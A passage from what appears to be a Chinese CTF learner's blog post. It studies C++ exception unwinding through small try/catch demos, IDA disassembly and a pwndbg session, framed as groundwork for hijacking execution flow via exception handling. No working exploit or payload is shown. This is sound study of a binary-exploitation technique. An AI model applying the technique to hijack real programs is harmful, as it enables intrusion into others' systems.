class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">test func1</span><br><span class="line">test func2</span><br><span class="line">func3 start</span><br><span class="line">catch 2</span><br><span class="line">func2 exit</span><br><span class="line">func1 exit</span><br><span class="line">main exit</span><br></pre></td></tr></table></figure><p>可以看到<code>func3</code>抛出异常之后，throw后面的代码不再执行。因为func3本身没有catch，所以会从他的调用者去找catch。这里catch理解成异常处理函数。catch2执行完之后会继续把func2、func1和main执行完。</p><h5 id="demo2"><a href="#demo2" class="headerlink" title="demo2"></a>demo2</h5><p>现在我们试试吧catch2也去掉：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test_func3</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;func3 start&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">throw</span> <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;test func3&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test_func2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;test func2&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">test_func3</span>();</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;func2 exit&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test_func1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;test func1&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">test_func2</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">catch</span> (...)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;catch 1&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;func1 exit&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">test_func1</span>();</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;main exit&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">test func1</span><br><span class="line">test func2</span><br><span class="line">func3 start</span><br><span class="line">catch 1</span><br><span class="line">func1 exit</span><br><span class="line">main exit</span><br></pre></td></tr></table></figure><p>可以看到由于func2也找不到catch，所以会沿着调用链继续向上找，找到了func1处的catch。伴随着func2中的catch的消失而发生的另一个变化是，func2也没有执行完，但是会从func1的catch后继续执行。</p><h5 id="demo3"><a href="#demo3" class="headerlink" title="demo3"></a>demo3</h5><p>接下来试试在程序中不定义catch看看会发生什么：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test_func3</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;func3 start&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">throw</span> <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;test func3&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test_func2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;test func2&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">test_func3</span>();</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;func2 exit&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test_func1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;test func1&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="built_in">test_func2</span>();</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;func1 exit&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">test_func1</span>();</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;main exit&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">test func1</span><br><span class="line">test func2</span><br><span class="line">func3 start</span><br><span class="line">terminate called after throwing an instance of &#x27;int&#x27;</span><br><span class="line">Aborted</span><br></pre></td></tr></table></figure><p>程序直接aborted了。</p><p>突发奇想，我们把刚刚实验生成的程序放到IDA中看看长什么样。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">test_func3</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  _DWORD *exception; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;func3 start&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::operator&lt;&lt;(v0, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  exception = __cxa_allocate_exception(<span class="number">4uLL</span>);</span><br><span class="line">  *exception = <span class="number">3</span>;</span><br><span class="line">  __cxa_throw(exception, (<span class="keyword">struct</span> type_info *)&amp;`typeinfo <span class="keyword">for</span><span class="number">&#x27;</span><span class="type">int</span>, <span class="number">0LL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>抛出异常部分的伪代码长这样。但是catch部分并不会出现在伪代码中，但是会体现在汇编当中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000001341 ;   try &#123;</span><br><span class="line">.text:0000000000001341                 call    _Z10test_func2v ; test_func2(void)</span><br><span class="line">.text:0000000000001341 ;   &#125; // starts at 1341</span><br><span class="line">.text:0000000000001346 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000001346</span><br><span class="line">.text:0000000000001346 loc_1346:                               ; CODE XREF: test_func1(void)+A6↓j</span><br><span class="line">.text:0000000000001346                 lea     rax, aFunc1Exit ; &quot;func1 exit&quot;</span><br><span class="line">.text:000000000000134D                 mov     rsi, rax</span><br><span class="line">.text:0000000000001350                 lea     rax, _ZSt4cout@GLIBCXX_3_4</span><br><span class="line">.text:0000000000001357                 mov     rdi, rax</span><br><span class="line">.text:000000000000135A                 call    __ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc ; std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(std::ostream &amp;,char const*)</span><br><span class="line">.text:000000000000135F                 mov     rdx, cs:_ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6__ptr</span><br><span class="line">.text:0000000000001366                 mov     rsi, rdx</span><br><span class="line">.text:0000000000001369                 mov     rdi, rax</span><br><span class="line">.text:000000000000136C                 call    __ZNSolsEPFRSoS_E ; std::ostream::operator&lt;&lt;(std::ostream &amp; (*)(std::ostream &amp;))</span><br><span class="line">.text:0000000000001371                 jmp     short loc_13C8</span><br><span class="line">.text:0000000000001373 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000001373 ;   catch(...) // owned by 1341</span><br><span class="line">.text:0000000000001373                 endbr64</span><br><span class="line">.text:0000000000001377                 mov     rdi, rax        ; void *</span><br><span class="line">.text:000000000000137A                 call    ___cxa_begin_catch</span><br><span class="line">.text:000000000000137F                 lea     rax, aCatch1    ; &quot;catch 1&quot;</span><br><span class="line">.text:0000000000001386                 mov     rsi, rax</span><br><span class="line">.text:0000000000001389                 lea     rax, _ZSt4cout@GLIBCXX_3_4</span><br><span class="line">.text:0000000000001390                 mov     rdi, rax</span><br><span class="line">.text:0000000000001393 ;   try &#123;</span><br><span class="line">.text:0000000000001393                 call    __ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc ; std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(std::ostream &amp;,char const*)</span><br><span class="line">.text:0000000000001398                 mov     rdx, cs:_ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6__ptr</span><br><span class="line">.text:000000000000139F                 mov     rsi, rdx</span><br><span class="line">.text:00000000000013A2                 mov     rdi, rax</span><br><span class="line">.text:00000000000013A5                 call    __ZNSolsEPFRSoS_E ; std::ostream::operator&lt;&lt;(std::ostream &amp; (*)(std::ostream &amp;))</span><br><span class="line">.text:00000000000013A5 ;   &#125; // starts at 1393</span><br><span class="line">.text:00000000000013AA                 call    ___cxa_end_catch</span><br><span class="line">.text:00000000000013AF                 jmp     short loc_1346</span><br><span class="line">.text:00000000000013B1 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000000013B1 ;   cleanup() // owned by 1393</span><br><span class="line">.text:00000000000013B1                 endbr64</span><br><span class="line">.text:00000000000013B5                 mov     rbx, rax</span><br><span class="line">.text:00000000000013B8                 call    ___cxa_end_catch</span><br><span class="line">.text:00000000000013BD                 mov     rax, rbx</span><br><span class="line">.text:00000000000013C0                 mov     rdi, rax        ; struct _Unwind_Exception *</span><br><span class="line">.text:00000000000013C3                 call    __Unwind_Resume</span><br><span class="line">.text:00000000000013C8 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000000013C8</span><br><span class="line">.text:00000000000013C8 loc_13C8:                               ; CODE XREF: test_func1(void)+68↑j</span><br><span class="line">.text:00000000000013C8                 mov     rbx, [rbp+var_8]</span><br><span class="line">.text:00000000000013CC                 leave</span><br><span class="line">.text:00000000000013CD                 retn</span><br><span class="line">.text:00000000000013CD ; &#125; // starts at 1309</span><br><span class="line">.text:00000000000013CD _Z10test_func1v endp</span><br></pre></td></tr></table></figure><p>可以看到0x13AF处执行完catch之后jmp到了0x1346，这个地方正好对应源码里func1 exit的部分。说明catch完会直接从当前位置继续执行。</p><p>那这里就会产生一个想法，比如说我如果想通过这个劫持执行流，我是否可以直接劫持func1的返回地址就行？</p><p>网上关于异常处理漏洞利用的地方几乎完全没看懂，所以打算自己动调看看到底程序在catch的时候发生了什么。</p><h4 id="网上的说法"><a href="#网上的说法" class="headerlink" title="网上的说法"></a>网上的说法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1）调用 __cxa_allocate_exception 函数，分配一个异常对象。</span><br><span class="line">2）调用 __cxa_throw 函数，这个函数会将异常对象做一些初始化。</span><br><span class="line">3）__cxa_throw() 调用 Itanium ABI 里的 _Unwind_RaiseException() 从而开始 unwind。</span><br><span class="line">4）_Unwind_RaiseException() 对调用链上的函数进行 unwind 时，调用 personality routine。</span><br><span class="line">5）如果该异常如能被处理(有相应的 catch)，则 personality routine 会依次对调用链上的函数进行清理。</span><br><span class="line">6）_Unwind_RaiseException() 将控制权转到相应的catch代码。</span><br></pre></td></tr></table></figure><p>几乎每一篇博客都能看到这些流程，但是我看得一头雾水，直到我自己动调看了程序的变化才有点头绪。</p><h4 id="在动调里挣扎"><a href="#在动调里挣扎" class="headerlink" title="在动调里挣扎"></a>在动调里挣扎</h4><p>我用了第一个demo的程序来做动调。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000001249 ; void __noreturn test_func3(void)</span><br><span class="line">.text:0000000000001249                 public _Z10test_func3v</span><br><span class="line">.text:0000000000001249 _Z10test_func3v proc near               ; CODE XREF: test_func2(void)+38↓p</span><br><span class="line">.text:0000000000001249 ; __unwind &#123;</span><br><span class="line">.text:0000000000001249                 endbr64</span><br><span class="line">.text:000000000000124D                 push    rbp</span><br><span class="line">.text:000000000000124E                 mov     rbp, rsp</span><br><span class="line">.text:0000000000001251                 lea     rax, aFunc3Start ; &quot;func3 start&quot;</span><br><span class="line">.text:0000000000001258                 mov     rsi, rax</span><br><span class="line">.text:000000000000125B                 lea     rax, _ZSt4cout@GLIBCXX_3_4</span><br><span class="line">.text:0000000000001262                 mov     rdi, rax</span><br><span class="line">.text:0000000000001265                 call    __ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc ; std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(std::ostream &amp;,char const*)</span><br><span class="line">.text:000000000000126A                 mov     rdx, cs:_ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6__ptr</span><br><span class="line">.text:0000000000001271                 mov     rsi, rdx</span><br><span class="line">.text:0000000000001274                 mov     rdi, rax</span><br><span class="line">.text:0000000000001277                 call    __ZNSolsEPFRSoS_E ; std::ostream::operator&lt;&lt;(std::ostream &amp; (*)(std::ostream &amp;))</span><br><span class="line">.text:000000000000127C                 mov     edi, 4          ; thrown_size</span><br><span class="line">.text:0000000000001281                 call    ___cxa_allocate_exception</span><br><span class="line">.text:0000000000001286                 mov     dword ptr [rax], 3</span><br><span class="line">.text:000000000000128C                 mov     edx, 0          ; void (*)(void *)</span><br><span class="line">.text:0000000000001291                 lea     rcx, _ZTIi@CXXABI_1_3</span><br><span class="line">.text:0000000000001298                 mov     rsi, rcx        ; lptinfo</span><br><span class="line">.text:000000000000129B                 mov     rdi, rax        ; void *</span><br><span class="line">.text:000000000000129E                 call    ___cxa_throw</span><br><span class="line">.text:000000000000129E ; &#125; // starts at 1249</span><br><span class="line">.text:000000000000129E _Z10test_func3v endp</span><br><span class="line">.text:000000000000129E</span><br><span class="line">.text:00000000000012A3</span><br><span class="line">.text:00000000000012A3 ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:00000000000012A3</span><br><span class="line">.text:00000000000012A3 ; Attributes: bp-based frame</span><br><span class="line">.text:00000000000012A3</span><br><span class="line">.text:00000000000012A3 ; void __noreturn test_func2(void)</span><br><span class="line">.text:00000000000012A3                 public _Z10test_func2v</span><br><span class="line">.text:00000000000012A3 _Z10test_func2v proc near               ; CODE XREF: test_func1(void)+38↓p</span><br><span class="line">.text:00000000000012A3</span><br><span class="line">.text:00000000000012A3 var_14          = dword ptr -14h</span><br><span class="line">.text:00000000000012A3 var_8           = qword ptr -8</span><br><span class="line">.text:00000000000012A3</span><br><span class="line">.text:00000000000012A3 ; __unwind &#123; // __gxx_personality_v0</span><br><span class="line">.text:00000000000012A3                 endbr64</span><br><span class="line">.text:00000000000012A7                 push    rbp</span><br><span class="line">.text:00000000000012A8                 mov     rbp, rsp</span><br><span class="line">.text:00000000000012AB                 push    rbx</span><br><span class="line">.text:00000000000012AC                 sub     rsp, 18h</span><br><span class="line">.text:00000000000012B0                 lea     rax, aTestFunc2 ; &quot;test func2&quot;</span><br><span class="line">.text:00000000000012B7                 mov     rsi, rax</span><br><span class="line">.text:00000000000012BA                 lea     rax, _ZSt4cout@GLIBCXX_3_4</span><br><span class="line">.text:00000000000012C1                 mov     rdi, rax</span><br><span class="line">.text:00000000000012C4                 call    __ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc ; std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(std::ostream &amp;,char const*)</span><br><span class="line">.text:00000000000012C9                 mov     rdx, cs:_ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6__ptr</span><br><span class="line">.text:00000000000012D0                 mov     rsi, rdx</span><br><span class="line">.text:00000000000012D3                 mov     rdi, rax</span><br><span class="line">.text:00000000000012D6                 call    __ZNSolsEPFRSoS_E ; std::ostream::operator&lt;&lt;(std::ostream &amp; (*)(std::ostream &amp;))</span><br><span class="line">.text:00000000000012DB ;   try &#123;</span><br><span class="line">.text:00000000000012DB                 call    _Z10test_func3v ; test_func3(void)</span><br><span class="line">.text:00000000000012DB ;   &#125; // starts at 12DB</span><br><span class="line">.text:00000000000012E0 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000000012E0</span><br><span class="line">.text:00000000000012E0 loc_12E0:                               ; CODE XREF: test_func2(void)+B9↓j</span><br><span class="line">.text:00000000000012E0                 lea     rax, aFunc2Exit ; &quot;func2 exit&quot;</span><br><span class="line">.text:00000000000012E7                 mov     rsi, rax</span><br><span class="line">.text:00000000000012EA                 lea     rax, _ZSt4cout@GLIBCXX_3_4</span><br><span class="line">.text:00000000000012F1                 mov     rdi, rax</span><br><span class="line">.text:00000000000012F4                 call    __ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc ; std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(std::ostream &amp;,char const*)</span><br><span class="line">.text:00000000000012F9                 mov     rdx, cs:_ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6__ptr</span><br><span class="line">.text:0000000000001300                 mov     rsi, rdx</span><br><span class="line">.text:0000000000001303                 mov     rdi, rax</span><br><span class="line">.text:0000000000001306                 call    __ZNSolsEPFRSoS_E ; std::ostream::operator&lt;&lt;(std::ostream &amp; (*)(std::ostream &amp;))</span><br><span class="line">.text:000000000000130B                 jmp     short loc_1375</span><br><span class="line">.text:000000000000130D ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000000130D ;   catch(_ZTIi@CXXABI_1_3) // owned by 12DB</span><br><span class="line">.text:000000000000130D                 endbr64</span><br><span class="line">.text:0000000000001311                 cmp     rdx, 1</span><br><span class="line">.text:0000000000001315                 jz      short loc_131F</span><br><span class="line">.text:0000000000001317                 mov     rdi, rax        ; struct _Unwind_Exception *</span><br><span class="line">.text:000000000000131A                 call    __Unwind_Resume</span><br><span class="line">.text:000000000000131F ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000000131F</span><br><span class="line">.text:000000000000131F loc_131F:                               ; CODE XREF: test_func2(void)+72↑j</span><br><span class="line">.text:000000000000131F                 mov     rdi, rax        ; void *</span><br><span class="line">.text:0000000000001322                 call    ___cxa_begin_catch</span><br><span class="line">.text:0000000000001327                 mov     eax, [rax]</span><br><span class="line">.text:0000000000001329                 mov     [rbp+var_14], eax</span><br><span class="line">.text:000000000000132C                 lea     rax, aCatch2    ; &quot;catch 2&quot;</span><br><span class="line">.text:0000000000001333                 mov     rsi, rax</span><br><span class="line">.text:0000000000001336                 lea     rax, _ZSt4cout@GLIBCXX_3_4</span><br><span class="line">.text:000000000000133D                 mov     rdi, rax</span><br><span class="line">.text:0000000000001340 ;   try &#123;</span><br><span class="line">.text:0000000000001340                 call    __ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc ; std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(std::ostream &amp;,char const*)</span><br><span class="line">.text:0000000000001345                 mov     rdx, cs:_ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6__ptr</span><br><span class="line">.text:000000000000134C                 mov     rsi, rdx</span><br><span class="line">.text:000000000000134F                 mov     rdi, rax</span><br><span class="line">.text:0000000000001352                 call    __ZNSolsEPFRSoS_E ; std::ostream::operator&lt;&lt;(std::ostream &amp; (*)(std::ostream &amp;))</span><br><span class="line">.text:0000000000001352 ;   &#125; // starts at 1340</span><br><span class="line">.text:0000000000001357                 call    ___cxa_end_catch</span><br><span class="line">.text:000000000000135C                 jmp     short loc_12E0</span><br><span class="line">.text:000000000000135E ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000000135E ;   cleanup() // owned by 1340</span><br><span class="line">.text:000000000000135E                 endbr64</span><br><span class="line">.text:0000000000001362                 mov     rbx, rax</span><br><span class="line">.text:0000000000001365                 call    ___cxa_end_catch</span><br><span class="line">.text:000000000000136A                 mov     rax, rbx</span><br><span class="line">.text:000000000000136D                 mov     rdi, rax        ; struct _Unwind_Exception *</span><br><span class="line">.text:0000000000001370                 call    __Unwind_Resume</span><br><span class="line">.text:0000000000001375 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000001375</span><br><span class="line">.text:0000000000001375 loc_1375:                               ; CODE XREF: test_func2(void)+68↑j</span><br><span class="line">.text:0000000000001375                 mov     rbx, [rbp+var_8]</span><br><span class="line">.text:0000000000001379                 leave</span><br><span class="line">.text:000000000000137A                 retn</span><br><span class="line">.text:000000000000137A ; &#125; // starts at 12A3</span><br><span class="line">.text:000000000000137A _Z10test_func2v endp</span><br></pre></td></tr></table></figure><p>首先先断点在<code>.text:000000000000129E                 call    ___cxa_throw</code>上，即func3即将抛出异常的地方，可以看到此时func3的ret地址是func2正常退出的地址(func2+61)</p><p><img src="https://c-lby.top/images/cpp_exception/func3%E6%96%AD%E7%82%B9ret%E5%9C%B0%E5%9D%80%E6%AD%A3%E5%B8%B8.png" alt="func3断点ret地址正常"></p><p>如果此时直接步过<code>__cxa_throw</code>，程序直接就往后执行完退出了，说明所有问题都出在这个函数里。因此我们步进去看看会发生什么。</p><p>步进之后可以进一步发现问题出在<code>_Unwind_RaiseException</code>函数里。这个函数实在是过于复杂，我在2024GFCTF中的control那道题里找到了这个函数的汇编代码（因为他是静态编译的），从加载出来的符号表可以看出这个函数的主要作用是更改上下文。</p><p>从实际效果出发来说的话就是他把func3的返回地址从func2的正常退出改成了func2中的catch块。</p><p>这里我偷了个懒，我直接在0x130D处下了断点，也就是刚开始执行func2的catch块的地方，然后关注栈上func3栈帧的返回地址。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">telescope 0x7fffffffdb50</span></span><br><span class="line">00:0000│-030     0x7fffffffdb50 —▸ 0x7fffffffdb80 —▸ 0x7fffffffdba0 —▸ 0x7fffffffdbb0 ◂— 0x1</span><br><span class="line">01:0008│-028     0x7fffffffdb58 